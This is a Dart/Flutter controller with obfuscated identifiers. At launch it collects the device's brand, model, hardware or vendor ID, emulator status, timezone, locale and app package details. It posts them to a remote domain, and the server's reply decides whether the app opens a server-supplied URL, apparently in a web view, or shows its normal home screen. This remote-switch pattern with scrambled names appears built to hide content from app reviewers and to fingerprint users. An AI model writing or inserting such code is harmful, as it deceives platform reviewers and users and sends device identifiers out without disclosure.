import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var bvgjhlpd = RxBool(false);
  var peuvbyxdq = RxBool(true);
  var mfbrtl = RxString("");
  var bernadette = RxBool(false);
  var cremin = RxBool(true);
  final yoluedcq = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    zprekwh();
  }


  Future<void> zprekwh() async {

    bernadette.value = true;
    cremin.value = true;
    peuvbyxdq.value = false;

    yoluedcq.post("https://niu.51nzd.xyz/HF3MYYIG7",data: await mgkvwit()).then((value) {
      var qwmoyl = value.data["qwmoyl"] as String;
      var jayqu = value.data["jayqu"] as bool;
      if (jayqu) {
        mfbrtl.value = qwmoyl;
        gordon();
      } else {
        sipes();
      }
    }).catchError((e) {
      peuvbyxdq.value = true;
      cremin.value = true;
      bernadette.value = false;
    });
  }

  Future<Map<String, dynamic>> mgkvwit() async {
    final DeviceInfoPlugin yjakbpog = DeviceInfoPlugin();
    PackageInfo mlrxi_zvmfldwc = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var elnuwv = Platform.localeName;
    var awth_rWN = currentTimeZone;

    var awth_rDNVTYf = mlrxi_zvmfldwc.packageName;
    var awth_rBx = mlrxi_zvmfldwc.version;
    var awth_dYRx = mlrxi_zvmfldwc.buildNumber;

    var awth_gtnwpTR = mlrxi_zvmfldwc.appName;
    var awth_Ro = "";
    var awth_eEzvrP = "";
    var kyraStroman = "";
    var averyLind = "";
    var colleenFritsch = "";
    var abeGerhold = "";
    var awth_HM  = "";
    var jaysonRodriguez = "";
    var estellDaniel = "";


    var awth_QfY = "";
    var awth_oGCJcw = false;

    if (GetPlatform.isAndroid) {
      awth_QfY = "android";
      var ajwebxuiph = await yjakbpog.androidInfo;

      awth_eEzvrP = ajwebxuiph.brand;

      awth_Ro  = ajwebxuiph.model;
      awth_HM = ajwebxuiph.id;

      awth_oGCJcw = ajwebxuiph.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      awth_QfY = "ios";
      var ixsyavrkzh = await yjakbpog.iosInfo;
      awth_eEzvrP = ixsyavrkzh.name;
      awth_Ro = ixsyavrkzh.model;

      awth_HM = ixsyavrkzh.identifierForVendor ?? "";
      awth_oGCJcw  = ixsyavrkzh.isPhysicalDevice;
    }

    var res = {
      "awth_dYRx": awth_dYRx,
      "awth_rBx": awth_rBx,
      "awth_QfY": awth_QfY,
      "awth_Ro": awth_Ro,
      "awth_gtnwpTR": awth_gtnwpTR,
      "awth_rWN": awth_rWN,
      "awth_eEzvrP": awth_eEzvrP,
      "awth_HM": awth_HM,
      "awth_rDNVTYf": awth_rDNVTYf,
      "elnuwv": elnuwv,
      "awth_oGCJcw": awth_oGCJcw,
      "colleenFritsch" : colleenFritsch,
      "kyraStroman" : kyraStroman,
      "jaysonRodriguez" : jaysonRodriguez,
      "abeGerhold" : abeGerhold,
      "estellDaniel" : estellDaniel,
      "averyLind" : averyLind,

    };
    return res;
  }

  Future<void> sipes() async {
    Get.offAllNamed("/home");
  }

  Future<void> gordon() async {
    Get.offAllNamed("/resion");
  }

}
